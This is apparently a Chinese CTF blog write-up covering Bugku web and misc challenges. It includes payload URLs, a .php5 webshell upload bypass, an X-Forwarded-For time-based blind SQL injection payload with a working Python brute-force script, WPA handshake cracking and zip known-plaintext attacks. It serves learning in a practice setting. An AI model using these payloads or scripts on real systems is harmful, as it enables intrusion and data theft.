+<p><strong>file_get_contents-将整个文件读入一个字符串</strong></p>
+<p><strong>2、分析得到</strong></p>
+<p><strong>（1）可能有txt文件</strong></p>
+<p><strong>（2）尝试发现：含有flag.txt文件，打开后有个Flags</strong></p>
+<p><strong>playload:<code>http://123.206.87.240:8002/web8/flag.txt</code></strong></p>
+<p><strong><img src="https://img-blog.csdnimg.cn/img_convert/30d55223392d41848d64ef39ab578526.png" alt="" loading="lazy"></strong></p>
+<p><strong>3、构造playload：<code>http://123.206.87.240:8002/web8/?ac=flags&amp;fn=flag.txt</code></strong></p>
+<p><strong><img src="https://img-blog.csdnimg.cn/img_convert/9846409afa5163a312951941830f6f19.png" alt="" loading="lazy"></strong></p>
+<h2 id="0x028细心"><strong>0x028—细心</strong></h2>
+<h3 id="解题思路-28"><strong>解题思路：</strong></h3>
+<p><strong>1、打开网站后发现是一个模拟404的网站，刚开始还有点信。查看源码发现了两个链接。点击无果</strong></p>
+<p><strong>2、利用BP抓包，发现没有任何信息。</strong></p>
+<p><strong>3、利用御剑扫描一下后台，发现了一个<code>http://123.206.87.240:8002/web13/robots.txt</code>URL</strong></p>
+<p><strong>(1)打开这个网站后</strong></p>
+<p><strong>(2)发现只有</strong></p>
+<p><strong><code>User-agent: </code></strong></p>
+<p><strong><code>Disallow: /resusl.php</code></strong></p>
+<p><strong>(3)将<code>resusl.php</code>放到/web13/的后面尝试访问</strong></p>
+<p><strong>(4)发现进入了	<img src="https://img-blog.csdnimg.cn/img_convert/a620fd17d396793f1a77a4f4787e9dab.png" alt="" loading="lazy"></strong></p>
+<p><strong>还有一行PHP代码</strong></p>
+<p><strong>(5)刚进入网页时，题目提醒 想办法变成admin ，所以尝试GET传参 x=admin	得到Flag</strong></p>
+<p><strong>4、参考playload:<code>http://123.206.87.240:8002/web13/resusl.php?x=admin</code></strong></p>
+<p><strong><img src="https://img-blog.csdnimg.cn/img_convert/f78ce249a140e2b78d9d441f7b66f98f.png" alt="" loading="lazy"></strong></p>
+<h2 id="0x029求getshell"><strong>0x029—求getshell</strong></h2>
+<h3 id="解题思路考点后缀名黑名单检测和类型检测"><strong>解题思路：					考点：后缀名黑名单检测和类型检测</strong></h3>
+<p><strong>1、打开网页查看源代码	无果</strong></p>
+<p><strong>2、打开BP抓包，我们上传的是一句话图片木马，刚开始想他让我们上传图片那图片类型不用更改，图片后缀不用更		改。</strong></p>
+<p><strong>3、最后做出来发现图片后缀可以添加也可以更改但必须是“.php5”的后缀。这里是经过许多的尝试才得到的。</strong></p>
+<p><strong><img src="https://img-blog.csdnimg.cn/img_convert/9c9358da70a677594393d37694f459ff.png" alt="" loading="lazy"></strong></p>
+<p><strong><img src="https://img-blog.csdnimg.cn/img_convert/ab6c9d385b2af5a2c91ef8d5f34e97de.png" alt="" loading="lazy"></strong></p>
+<p><strong>4、最后得到Flag</strong></p>
+<p><strong><img src="https://img-blog.csdnimg.cn/img_convert/609d0176d28a3d3ef1dc70944d6398ac.png" alt="" loading="lazy"></strong></p>
+<h2 id="0x030insert-into注入"><strong>0x030—INSERT INTO注入</strong></h2>
+<h3 id="解题思路-29"><strong>解题思路：</strong></h3>
+<p><strong>1、打开题目发现他把源码直接放在了题目中</strong></p>
+<p><strong>接下来代码审计</strong></p>
+<pre><code>error_reporting(0);
+
+function getIp(){
+$ip = '';
+if(isset($_SERVER['HTTP_X_FORWARDED_FOR'])){
+$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
+}else{
+$ip = $_SERVER['REMOTE_ADDR'];
+}
+$ip_arr = explode(',', $ip);
+return $ip_arr[0];
+
+}
+
+$host=&quot;localhost&quot;;
+$user=&quot;&quot;;
+$pass=&quot;&quot;;
+$db=&quot;&quot;;
+
+$connect = mysql_connect($host, $user, $pass) or die(&quot;Unable to connect&quot;);
+
+mysql_select_db($db) or die(&quot;Unable to select database&quot;);
+
+$ip = getIp();
+echo 'your ip is :'.$ip;
+$sql=&quot;insert into client_ip (ip) values ('$ip')&quot;;
+mysql_query($sql);
+</code></pre>
+<p><strong>发现，在10行的时候$ip被截取了</strong></p>
+<p><strong>.explode函数的作用是按规则拆分为数组．例如：explode(&quot; &quot;,$str)</strong></p>
+<p><strong>明确注入点是HTTP头，尝试利用 x-forwarded-for 来进行注入，但过程中发现逗号被过滤了。</strong></p>
+<p><strong>在mysql中与if具有相同效果的是：</strong></p>
+<p><strong><code>select case when (条件) then 代码1 else 代码 2 end;</code></strong></p>
+<p><strong>而且由于逗号,被过滤，我们就不能使用substr、substring了，但我们可以使用：from 1 for 1</strong></p>
+<p><strong>参考playload:</strong></p>
+<p><strong><code>127.0.0.1'+(select case when substr((select flag from flag) from 1 for 1)='a'then sleep(5) else 0 end))--+ </code></strong></p>
+<p><strong>利用python脚本：</strong></p>
+<pre><code class="language-python"># -*- coding:utf-8 -*-
+import requests
+import sys
+# 基于时间的盲注，过滤了逗号 ,
+sql = &quot;127.0.0.1'+(select case when substr((select flag from flag) from {0} for 1)='{1}' then sleep(5) else 0 end))-- +&quot;
+url = 'http://120.24.86.145:8002/web15/'
+flag = ''
+for i in range(1, 40):
+    print('正在猜测：', str(i))
+    for ch in range(32, 129):
+        if ch == 128:
+            sys.exit(0)
+        sqli = sql.format(i, chr(ch))
+        # print(sqli)
+        header = {
+            'X-Forwarded-For': sqli
+        }
+        try:
+            html = requests.get(url, headers=header, timeout=3)
+        except:
+            flag += chr(ch)
+            print(flag)
+            break
+</code></pre>
+<p><strong>得到Flag:</strong></p>
+<p><strong><code>flag{cdbf14c9551d5be5612f7bb5d2867853} </code></strong></p>
+<h2 id="0x031flagphp"><strong>0x031—flag.php</strong></h2>
+<h3 id="解题思路-30"><strong>解题思路：</strong></h3>
+<p><strong>1、</strong></p>
+<p><strong>2、</strong></p>
+<h2 id="0x032"><strong>0x032—</strong></h2>
+<h3 id="解题思路-31"><strong>解题思路：</strong></h3>
+<h2 id="0x033"><strong>0x033—</strong></h2>
+<h3 id="解题思路-32"><strong>解题思路：</strong></h3>
+<h2 id="0x034"><strong>0x034—</strong></h2>
+<h3 id="解题思路-33"><strong>解题思路：</strong></h3>
+<h2 id="0x035"><strong>0x035—</strong></h2>
+<h3 id="解题思路-34"><strong>解题思路：</strong></h3>
+<h2 id="0x036"><strong>0x036—</strong></h2>
+<h3 id="解题思路-35"><strong>解题思路：</strong></h3>
+<h1 id="杂项"><strong>杂项</strong></h1>
+<h2 id="0x001telnet"><strong>0x001	telnet	⭐</strong></h2>
+<h3 id="解题思路-36"><strong>解题思路：</strong></h3>
+<p><strong>1、下载压缩包，解压，发现里面有一个流量包，用wireshark打开该流量包</strong></p>
+<p><strong>2、右键追踪即可得到flag</strong></p>
+<p><strong><img src="https://img-blog.csdnimg.cn/img_convert/4e65c4d363095bfe645eb120ae88a55e.png" alt="" loading="lazy"></strong></p>
+<h2 id="0x002眼见非实isccctf"><strong>0x002	眼见非实(ISCCCTF)	⭐</strong></h2>
+<h3 id="解题思路-37"><strong>解题思路：</strong></h3>
+<p><strong>1、首先把压缩包下载下来，发现没有前缀</strong></p>
+<p><strong>2、尝试给他添加一个前缀名<code>1.zip</code></strong></p>
+<p><strong>3、发现可以运行，打开他有一个<code>doxc</code>文件，尝试打开发现提示打开错误</strong></p>
+<p><strong>4、我们再将这个的后缀该为压缩文件<code>.zip</code></strong></p>
+<p><strong>5、发现可以运行并打开他</strong></p>
+<p><strong>6、里面有一大堆的<code>.xml</code>为后缀的文件，利用记事本打开去查询flag</strong></p>
+<p><strong>7、最后在众多文件中找到了flag，他就藏在文件中</strong></p>
+<p><strong><img src="https://img-blog.csdnimg.cn/img_convert/be04e4e565a92cb8314702d0f7e817b9.png" alt="" loading="lazy"></strong></p>
+<h3 id="技巧"><strong>技巧</strong></h3>
+<ol>
+<li><strong>这里利用一个小技巧，用记事本打开后按住ctrl+F可以快速调出查询命令，在里面输入flag进行查询快捷些。</strong></li>
+</ol>
+<h2 id="0x003猜"><strong>0x003	猜	⭐</strong></h2>
+<h3 id="解题思路-38"><strong>解题思路：</strong></h3>
+<p><strong>1、打开网站是一张图片，有一个女人的半张脸</strong></p>
+<p><strong>2、这道题给的提示就是让我们猜这个人的名字，虽然是个明星但本人不认识。</strong></p>
+<p><strong>3、打开百度识图发现是刘亦菲</strong></p>
+<p><strong><img src="https://img-blog.csdnimg.cn/img_convert/7479b0be87fc6c229417d93bf335a052.png" alt="" loading="lazy"></strong></p>
+<h2 id="0x004宽带信息泄露"><strong>0x004	宽带信息泄露	⭐⭐</strong></h2>
+<h3 id="解题思路-39"><strong>解题思路：</strong></h3>
+<p><strong>1、将bin文件下载下来</strong></p>
+<p><strong>2、百度查阅了下打开bin文的软件，在windows下是 RouterPassView 软件查看配置文件</strong></p>
+<p><strong>3、将bin文件用它打开，利用快捷键进行查找宽带的用户名` ctrl+F 查看 username 即可得到flag</strong></p>
+<p><strong><img src="https://img-blog.csdnimg.cn/img_convert/e0eac7f15c1b212ae7aff529e5a36aa1.png" alt="" loading="lazy"></strong></p>
+<p><strong>RouterPassView下载地址： http://99idc.jb51.net:81/201206/tools/routerpassview_jb51net.rar</strong></p>
+<p><strong>RouterPassView：RouterPassView – 路由密码查看</strong></p>
+<p><strong>RouterPassView是 NirSoft 出品的一款路由密码恢复软件，可以查看绝大多数家用路由的配置文件中保存的密码，使用时只需要RouterPassView 打开导出的路由配置文件即可。</strong></p>
+<h2 id="0x005多种方法解决"><strong>0x005	多种方法解决	⭐</strong></h2>
+<h3 id="解题思路-40"><strong>解题思路：</strong></h3>
+<p><strong>1、打开题目将压缩包下载下来</strong></p>
+<p><strong>2、解压后尝试打开.exe文件发现打不开</strong></p>
+<p><strong>3、题目提示说做题过程中有可能会出现二维码，将解压后的文件放到文本里发现有可能是base64编码，百度搜索base64转图片，将字符串放入转化得到二维码，扫描二维码得到flag</strong></p>
+<p><strong><img src="https://img-blog.csdnimg.cn/img_convert/92d52d77af468a693c3428d732b33472.png" alt="" loading="lazy"></strong></p>
+<p><strong><img src="https://img-blog.csdnimg.cn/img_convert/e645f7df1cf0e3d629f3f46cb3ca5b1d.png" alt="" loading="lazy"></strong></p>
+<h2 id="0x006闪的好快"><strong>0x006	闪的好快	⭐</strong></h2>
+<h3 id="解题思路-41"><strong>解题思路：</strong></h3>
+<p><strong>1、打开题目发现是一个二维码动图，利用Stegsolve对gif进行浏览每一帧</strong></p>
+<p><strong>2、用手机去扫码一个一个扫得到flag</strong></p>
+<p><strong><img src="https://img-blog.csdnimg.cn/img_convert/08943d1e9a233122b6668cecea706511.png" alt="" loading="lazy"></strong></p>
+<p><strong>注：下划线扫码得到的是一个刚，记得改为下划线</strong></p>
+<p><strong>stegsolve下载地址：http://www.caesum.com/handbook/Stegsolve.jar</strong></p>
+<p><strong>stegsolve安装配置：配置好Java环境变量</strong></p>
+<p><strong>stegsolve功能简介： https://www.cnblogs.com/dzkwwj/p/9473357.html</strong></p>
+<h2 id="0x007白哥的鸽子"><strong>0x007	白哥的鸽子	⭐</strong></h2>
+<h3 id="解题思路-42"><strong>解题思路：</strong></h3>
+<p><strong>1、打开题目下载文件，添加后缀.jpg显示图片</strong></p>
+<p><strong>2、打开图片只有一个鸽子的图案</strong></p>
+<p><strong><img src="https://img-blog.csdnimg.cn/img_convert/8dddeffdd6e8e6c5c5fc4e3399cab557.png" alt="" loading="lazy"></strong></p>
+<p><strong>3、尝试将图片方进文本文档，查找Flag无果</strong></p>
+<p><strong>4、再利用WinHex进行查看发现最后一行有个很特别的</strong></p>
+<p><strong>一串字符</strong></p>
+<p><strong><img src="https://img-blog.csdnimg.cn/img_convert/2b14549dfad32639cf471733c168b510.png" alt="" loading="lazy"></strong></p>
+<p><strong>5、经过一些查找发先这是一个 栅栏密码 ，将他进行栅栏解密</strong></p>
+<p><strong>6、解密过程中他会有选择<code>每组字数</code>的初始为2</strong></p>
+<p><strong>2	： f3g_2oi@vaywo_}_lr{c2ls@</strong></p>
+<p><strong>3	： flag{w22_is_v3ry_cool}@@</strong></p>
+<p><strong>4	： fo3_g}__2lori{@cv2alysw@</strong></p>
+<p><strong>5	： fy2@rgosac2}3wlil__@v{o_</strong></p>
+<p><strong>6	： fvl3argy{<em>wc2o2o_li}s@</em>@</strong></p>
+<p><strong>尝试到六已经出来了，每组字数为三即可得到Flag</strong></p>
+<p><strong>注：栅栏密码——密码学—加密学</strong></p>
+<p><strong>加密原理详解参考：https://baike.baidu.com/item/%E6%A0%85%E6%A0%8F%E5%AF%86%E7%A0%81/228209?fr=aladdin</strong></p>
+<p><strong>所谓栅栏密码，就是把要加密的明文分成N个一组，然后把每组的第1个字连起来，形成一段无规律的话。 不过栅栏密码本身有一个潜规则，就是组成栅栏的字母一般不会太多。（一般不超过30个，也就是一、两句话）</strong></p>
+<h2 id="0x008隐写"><strong>0x008	隐写	⭐</strong></h2>
+<h3 id="解题思路-43"><strong>解题思路：</strong></h3>
+<p><strong>1、将图片放到Win Hex里更改长度让他成为一个正方形</strong></p>
+<p><strong>2、得到flag</strong></p>
+<p><strong><img src="https://img-blog.csdnimg.cn/img_convert/f8ffbe11915767d814283cadd0a3167d.png" alt="1601521141599" loading="lazy"></strong></p>
+<h2 id="0x009啊哒"><strong>0x009	啊哒	⭐</strong></h2>
+<h3 id="解题思路-44"><strong>解题思路：</strong></h3>
+<p><strong>1、将图片放到Win Hex里发现有隐藏文件</strong></p>
+<p><strong>2、用kali的binwalk将文件分离</strong></p>
+<p><strong>3、有个压缩包，里面的文件有密码，刚开始使用fcrackzip发现无果</strong></p>
+<p><strong>4、在windos下发现刚开始的图片属性里有个16进制的编码，解码得到压缩包密码</strong></p>
+<p><strong>5、即可得到flag</strong></p>
+<p><strong><img src="https://img-blog.csdnimg.cn/img_convert/9396e2902721d01e4fc085143d0d47d0.png" alt="1601534192330" loading="lazy"></strong></p>
+<h2 id="0x010又一张图片还单纯吗"><strong>0x010	又一张图片，还单纯吗	⭐</strong></h2>
+<h3 id="解题思路-45"><strong>解题思路：</strong></h3>
+<p><strong>1、现右击查看属性无果</strong></p>
+<p><strong>2、放进Win Hex里查看无果</strong></p>
+<p><strong>3、放进kali里用binwalk查看有文件存在</strong></p>
+<p><strong>4、刚开始利用binwalk -e进行分离发现没有用</strong></p>
+<p><strong>5、百度发现有一个命令 foremost 可以将图片中的文件分离</strong></p>
+<p><strong>6、即可得到flag</strong></p>
+<p><strong>注: foremost用法</strong></p>
+<pre><code>foremost [-v|-V|-h|-T|-Q|-q|-a|-w-d] [-t &lt;type&gt;] [-s &lt;blocks&gt;] [-k &lt;size&gt;] [-b &lt;size&gt;] [-c &lt;file&gt;] [-o &lt;dir&gt;] [-i &lt;file] 
+
+参数说明
+-V  - 显示版权信息并退出
+-t  - 指定文件类型.  (-t jpeg,pdf ...) 
+-d  -打开间接块检测 (针对UNIX文件系统) 
+-i  - 指定输入文件 (默认为标准输入) 
+-a  - 写入所有的文件头部, 不执行错误检测(损坏文件) 
+-w  - 向磁盘写入审计文件，不写入任何检测到的文件
+-o  - 设置输出目录 (默认为为输出)
+-c  - 设置配置文件 (默认为 foremost.conf)
+-q  - 启用快速模式. 在512字节边界执行搜索.
+-Q  - 启用安静模式. 禁用输出消息. 
+-v  - 详细模式. 向屏幕上记录所有消息。
+</code></pre>
+<p><strong>或     foremost	+  文件名</strong></p>
+<h2 id="0x011隐写2"><strong>0x011	隐写2	⭐</strong></h2>
+<h3 id="解题思路-46"><strong>解题思路：</strong></h3>
+<p><strong>1、将图片放进kali里利用binwalk分离</strong></p>
+<p><strong>2、发现是个加密压缩包利用windos的rar暴力破解软件破解得到密码</strong></p>
+<p><strong>3、打开有张图，利用txt打开他搜索f在最后一行</strong></p>
+<p><strong>4、是个base64加密答案，解密得到flag但提交格式为f1@g{y0u Are a h@cker!}，尝试了很久才发现心累。</strong></p>
+<h2 id="0x012come_game"><strong>0x012	come_game	⭐⭐⭐</strong></h2>
+<h3 id="解题思路-47"><strong>解题思路：</strong></h3>
+<p><strong>1、点击游戏现玩下，退出后发现有了文件</strong></p>
+<p><strong>2、将为文件尝试放进WinHex里去解读</strong></p>
+<p><strong>3、发现有个位置是控制关卡的将他改为5，重新打开游戏即可得到flag</strong></p>
+<p><strong><img src="https://img-blog.csdnimg.cn/img_convert/4594550d4a14ca59673b184ac1e2df38.png" alt="1601568413842" loading="lazy"></strong></p>
+<h2 id="0x013linux"><strong>0x013	linux	⭐</strong></h2>
+<h3 id="解题思路-48"><strong>解题思路：</strong></h3>
+<p><strong>方法一、</strong></p>
+<p><strong>1、解压后有个无后缀的文件</strong></p>
+<p><strong>2、放进kali里用strings来查看内容，发现flag、</strong></p>
+<p><strong>注:strings的用法</strong></p>
+<p><strong><code> strings [ -a ] [ - ] [ -o ] [ -t Format ] [ -n Number ] [ -Number ] [ file ... ]</code></strong></p>
+<p><strong>`-a --all：扫描整个文件而不是只扫描目标文件初始化和装载段</strong><br>
+<strong>-f –print-file-name：在显示字符串前先显示文件名</strong><br>
+<strong>-n –bytes=[number]：找到并且输出所有NUL终止符序列</strong></p>
+<ul>
+<li><strong>：设置显示的最少的字符数，默认是4个字符</strong><br>
+<strong>-t --radix={o,d,x} ：输出字符的位置，基于八进制，十进制或者十六进制</strong><br>
+<strong>-o ：类似--radix=o</strong><br>
+<strong>-T --target= ：指定二进制文件格式</strong><br>
+<strong>-e --encoding={s,S,b,l,B,L} ：选择字符大小和排列顺序:s = 7-bit, S = 8-bit, {b,l} = 16-bit, {B,L} = 32-bit</strong><br>
+<strong>@ ：读取中选项`</strong></li>
+</ul>
+<p><strong>方法二、</strong></p>
+<p><strong>解压直接用记事本打开搜索<code>key</code>得到flag</strong></p>
+<p><strong>方法三、</strong></p>
+<p><strong>在kali里用<code>cat flag</code>得到flag，flag就在最后面</strong></p>
+<h2 id="0x014隐写3"><strong>0x014	隐写3	⭐</strong></h2>
+<h3 id="解题思路-49"><strong>解题思路：</strong></h3>
+<p><strong>1、将图片放到Win Hex里更改高度得到flag</strong></p>
+<h2 id="0x015做个游戏08067ctf"><strong>0x015	做个游戏(08067CTF)	⭐⭐</strong></h2>
+<h3 id="解题思路-50"><strong>解题思路：</strong></h3>
+<p><strong>1、打开游戏是个不可能过关的游戏，将窗口放大发现小方块可以到空白的地方躲避小绿帽子</strong></p>
+<p><strong>2、结果没用，放进kali里利用binwalk查看，有隐藏文件，-e分离</strong></p>
+<p><strong>3、尝试用grep指令进行查看内容，指令为grep  -i  “查找的字符”  文件名</strong></p>
+<p><strong>4、得到flag的base64加密，解密得到flag</strong></p>
+<p><strong>注:grep的用法<code>https://www.cnblogs.com/lemon-feng/p/11249461.html</code></strong></p>
+<p><strong>grep -i &quot;test&quot; test.txt  搜索出含有“test” 字符串（-i:不区分大小）</strong></p>
+<p><strong><img src="https://img-blog.csdnimg.cn/img_convert/5b28661be8c785605a6a4106be9d83c4.png" alt="img" loading="lazy"></strong></p>
+<p><strong>grep -i -n &quot;test&quot; test.txt  搜索出含有“test” 字符串（-i:不区分大小）,并打印行号</strong></p>
+<p><strong><img src="https://img-blog.csdnimg.cn/img_convert/182f8ba1d4ec76e3a0153cc35b50a1c9.png" alt="img" loading="lazy"></strong></p>
+<p><strong>grep -i -n --color &quot;test&quot; test.txt 搜索出含有“test” 字符串（-i:不区分大小）,并打印行号，关键字“test”颜色标记（centos7系统默认为grep命令配置了别名，所以不使用—color也能显示颜色）</strong></p>
+<p><strong><img src="https://img-blog.csdnimg.cn/img_convert/26b8192de312afe595c65f0e2ea5d210.png" alt="img" loading="lazy"></strong></p>
+<p><strong>grep -I -c &quot;test&quot; test.txt，打印“test”字符串（不区分大小写）显示的次数</strong></p>
+<p><strong><img src="https://img-blog.csdnimg.cn/img_convert/638d9149033b64d8960cfa8c5176400b.png" alt="img" loading="lazy"></strong></p>
+<p><strong>grep -I -o &quot;test&quot; test.txt，打印“test”字符串（不区分大小写），但不打印整行</strong></p>
+<p><strong><img src="https://img-blog.csdnimg.cn/img_convert/d2f66cbd5d41c76bcf333edbac4befcc.png" alt="img" loading="lazy"></strong></p>
+<p><strong>grep -A1 “18” test2.txt,打印“18”字符串和它上一行的信息</strong></p>
+<p><strong><img src="https://img-blog.csdnimg.cn/img_convert/68238b5197744c0c1a9b44a4d672697e.png" alt="img" loading="lazy"></strong></p>
+<p><strong>grep -B1 “18” test2.txt,打印“18”字符串和它下一行的信息</strong></p>
+<p><strong><img src="https://img-blog.csdnimg.cn/img_convert/ab99ef6222f4a5f1111e91e8377f1b10.png" alt="img" loading="lazy"></strong></p>
+<p><strong>grep -C1 “18” test2.txt,打印“18”字符串和它上一行和下一行的信息</strong></p>
+<p><strong><img src="https://img-blog.csdnimg.cn/img_convert/d136a116148d7170d86c6ca92f42a29b.png" alt="img" loading="lazy"></strong></p>
+<p><strong>grep -w &quot;dlf&quot; test.txt，精确匹配出“dlf”字符串的</strong></p>
+<p><strong><img src="https://img-blog.csdnimg.cn/img_convert/44f3ff59573cbc79009e9ee72f7ea1fe.png" alt="img" loading="lazy"></strong></p>
+<p><strong>grep -v &quot;dlf&quot; test.txt，匹配出不包含“dlf”字符串的行</strong></p>
+<p><strong><img src="https://img-blog.csdnimg.cn/img_convert/da7adbd5907e64a3ea40b0eb7b19ddfb.png" alt="img" loading="lazy"></strong></p>
+<p><strong>grep -e 'abc' -e 'dlf' test.txt，同时匹配”abc”和”test”字符串</strong></p>
+<p><strong><img src="https://img-blog.csdnimg.cn/img_convert/3cf20b25bd79852b94ff168ae7013ca6.png" alt="img" loading="lazy"></strong></p>
+<p><strong>grep -q 静默模式</strong></p>
+<p><strong>静默模式下grep不会输入任何信息，无论是否匹配到指定的字符串，都不会输出任何信息，所以配合使用“echo %?”命令，查看命令的执行状态，如果返回值0，证明上一条grep命令匹配到了指定的字符串，如果返回值1，则证明上一条grep命令没有匹配到指定的字符串。</strong></p>
+<p><strong><img src="https://img-blog.csdnimg.cn/img_convert/bd7fe84cf220792f11e3abc68d208e23.png" alt="img" loading="lazy"></strong></p>
+<h2 id="0x016想蹭网先解开密码"><strong>0x016		想蹭网先解开密码	⭐⭐⭐⭐</strong></h2>
+<h3 id="解题思路-51"><strong>解题思路：</strong></h3>
+<p><strong>1、打开流量包查看， WIFI连接认证的重点在WPA的四次握手包，也就是eapol协议的包，过滤一下</strong></p>
+<p><strong>2、在kali里生成字典， 使用crunch生成密码字典 <img src="https://img-blog.csdnimg.cn/img_convert/a6b7c7ddddb34d3f7a1f08f2d2015b4a.png" alt="1601945863155" loading="lazy"></strong></p>
+<p><strong>3、 利用aircrack 进行爆破 <img src="https://img-blog.csdnimg.cn/img_convert/cce6898f155655dfa7db990e136a7fb7.png" alt="img" loading="lazy"></strong></p>
+<p><strong>4、得到flag</strong></p>
+<h2 id="0x017linux2"><strong>0x017	Linux2	⭐</strong></h2>
+<h3 id="解题思路-52"><strong>解题思路：</strong></h3>
+<p><strong>1、将文件用kali的binwalk扫描一下发现有文件</strong></p>
+<p><strong>2、用改命令工具分离，发现文件太多</strong></p>
+<p><strong>3、用grep命令搜索KEY得到flag</strong></p>
+<h2 id="0x018细心的大象"><strong>0x018	细心的大象	⭐</strong></h2>
+<h3 id="解题思路-53"><strong>解题思路：</strong></h3>
+<p><strong>1、将图片放进kali里查看有隐藏文件，分离</strong></p>
+<p><strong>2、得到rar压缩包有密码尝试Windows下爆破无果</strong></p>
+<p><strong>3、发现图像的属性里有一串base64加密字符串解密得到密码</strong></p>
+<p><strong>4、将解密得到的图片放近Win Hex里更改高度,得到flag</strong></p>
+<h2 id="0x019爆照08067ctf"><strong>0x019	爆照(08067CTF)	⭐⭐</strong></h2>
+<h3 id="解题思路-54"><strong>解题思路：</strong></h3>
+<p><strong>1、将图片放进kali里分离隐藏文件</strong></p>
+<p><strong>2、得到一个很奇怪的文件，里面全是数字8组成的文件无后缀</strong></p>
+<p><strong>3、还有一个gif的动图，查看为无果</strong></p>
+<p><strong>4、在88文件中 有个二维码扫描获得bilibili</strong></p>
+<p><strong>5、在8888文件中隐藏了 一个二维码扫码获得panama</strong></p>
+<p><strong>6、在888文件属性中发现有个base64加密字符串解密得到一部分flag</strong></p>
+<p><strong>7、将之前得到的答案按顺序组合起来得到完整的flag` flag{bilibili_silisili_panama}</strong></p>
+<h2 id="0x020猫片安恒难"><strong>0x020	猫片(安恒)	难⭐⭐⭐⭐</strong></h2>
+<h3 id="解题思路-55"><strong>解题思路：</strong></h3>
+<p><strong>1、放到stegsolve里查看，在Data Extract里发现有个图片但文件头被添加了其他东西</strong></p>
+<p><strong><img src="https://img-blog.csdnimg.cn/img_convert/07c3f6dcefaf0c441b836e0341c67510.png" alt="1602055716819" loading="lazy"></strong></p>
+<p><strong>2、将他保存为图片到Win Hex里删除头部添加的东西得到一半的二维码，在更改长度</strong></p>
+<p><strong>3、得到完整的二维码，扫描得到一个网站，发现是百度云盘，将为文件下载下来</strong></p>
+<p><strong>4、解压发现解压失败，当时以为是伪加密</strong></p>
+<p><strong>5、结果是利用NTFS交换数据流隐藏文件</strong></p>
+<p><strong>6、去网上查找资料得到相应的软件，利用它得到了一个<code>.py</code>的文件</strong></p>
+<p><strong>7、 直接丢到这。。https://tool.lu/pyc/</strong></p>
+<p><strong><img src="https://img-blog.csdnimg.cn/img_convert/f49d58b794ecb13b0c448d3cb6212a88.png" alt="1602056190227" loading="lazy"></strong></p>
+<p><strong>8、反编译放到python里跑下得到flag</strong></p>
+<p><strong><img src="https://img-blog.csdnimg.cn/img_convert/de4aec0acae4bfba5d5f55db5cba3a4e.png" alt="1602056320674" loading="lazy"></strong></p>
+<p><strong>注:推荐一个网站比较方便<code>https://tool.lu/coderunner/</code></strong></p>
+<h2 id="0x021多彩"><strong>0x021	多彩⭐⭐⭐⭐</strong></h2>
+<h3 id="解题思路-56"><strong>解题思路：</strong></h3>
+<p><strong>1、将图片放到Win Hex里无果</strong></p>
+<p><strong>2、放到stegsolve里发现有个YSL字样</strong></p>
+<p><strong>3、尝试用 Data Extract发现有个zip的包保存为zip发现文件需要密码</strong></p>
+<p><strong>4、看见之前的 YSL字样百度发现是个口红的牌子</strong></p>
+<p><strong>5、将给的图片利用吸管工具将16进制的颜色全部转化为2进制在转为字符</strong></p>
+<p><strong>6、得到密码<code>白学家</code>即可得到flag</strong></p>
+<h2 id="0x022旋转跳跃工具有点偏"><strong>0x022	旋转跳跃⭐	（工具有点偏）</strong></h2>
+<h3 id="解题思路-57"><strong>解题思路：</strong></h3>
+<p><strong>1、利用MP3StegoDecode工具</strong></p>
+<p><strong>2、命令如下</strong></p>
+<p><strong><img src="https://img-blog.csdnimg.cn/img_convert/610a761171e799ce4119d6afa418712b.png" alt="1602063373782" loading="lazy"></strong></p>
+<p><strong>1）第一个是工具名	2）第二个是-X是获取隐藏的东西 	3）第三个-P后面写密码 	4）第四个是密码	5）第五个是要解密的音频</strong></p>
+<h2 id="0x023普通的二维码"><strong>0x023		普通的二维码⭐⭐</strong></h2>
+<h3 id="解题思路-58"><strong>解题思路：</strong></h3>
+<p><strong>1、放进Win Hex里 发现尾部有一串数字</strong></p>
+<p><strong>2、发现都是已1开头的，百度后发现是8进制数</strong></p>
+<p><strong>3、写脚本将他变为8进制数并且转为 ascii 码得到flag</strong></p>
+<pre><code>str = '146154141147173110141166145137171060125137120171137163143162151160164137117164143137124157137124145156137101163143151151041175'
+flag = ''
+a = int(len(str)/3)
+for i in range(a):
+    flag += chr(int(str[i*3:i*3+3],8))
+print(flag)
+</code></pre>
+<h2 id="0x024乌云邀请码"><strong>0x024	乌云邀请码⭐</strong></h2>
+<h3 id="解题思路-59"><strong>解题思路：</strong></h3>
+<p><strong>1、放进stegsolve里尝试用 Data Extract打开</strong></p>
+<p><strong>2、发现 flag</strong></p>
+<h2 id="0x025神秘的文件工具有问题"><strong>0x025	神秘的文件⭐⭐⭐	工具有问题</strong></h2>
+<h3 id="解题思路-60"><strong>解题思路：</strong></h3>
+<p><strong>1、将压缩包解压得到一个压缩包和图片</strong></p>
+<p><strong>2、猜测有可能是明文攻击</strong></p>
+<p><strong>3、 如下图所示：得到密码	q1w2e3r4</strong></p>
+<p><strong>flag.zip作为密文压缩包</strong><br>
+<strong>logo.zip作为明文压缩包</strong><br>
+<strong>攻击类型：明文攻击</strong></p>
+<p><strong><img src="https://img-blog.csdnimg.cn/img_convert/e9c06f34fab4adf71df6657d2037fec0.png" alt="在这里插入图片描述" loading="lazy"></strong></p>
+<p><strong>4、将flag.zip解压得到的word文件放进kali里分离出个文件在里面找flag</strong></p>
+<p><strong>5、得到一个base64加密的文件，解密得到flag</strong></p>
+<h2 id="0x026论剑"><strong>0x026	论剑⭐⭐⭐⭐</strong></h2>
+<h3 id="考点"><strong>考点</strong></h3>
+<ul>
+<li><strong>JPG图片宽高尺寸的更改位置<code>FFC2</code></strong></li>
+<li><strong>文件标识头7z:<code>37 7A BC AF 27 1C</code></strong></li>
+<li><strong>在kali中部分数据提取命令<code>dd</code></strong></li>
+</ul>
+<h3 id="解题思路-61"><strong>解题思路：</strong></h3>
+<p><strong>1、用010打开图片，发现是由两张图片组成的，在两张图片的头尾交接处发现有一串二进制的数，尝试将他转为Ascii码得到一串字符<code>mynameiskey!!!hhh</code></strong></p>
+<p><strong>2、到这里思路断了，尝试去改高度，百度后发现JPG的高度是在16进制<code>FFC2</code>处再往后三个字节就是图片大小尺寸</strong></p>
+<p><strong>普通的JPG的图片大小尺寸都在<code>FFC2</code>后三个字节处开始，总共就两个字节</strong></p>
+<p><strong><img src="https://img-blog.csdnimg.cn/img_convert/f2f56dc25efb6d17ddd8352bf9b19652.png" alt="1605231321348" loading="lazy"></strong></p>
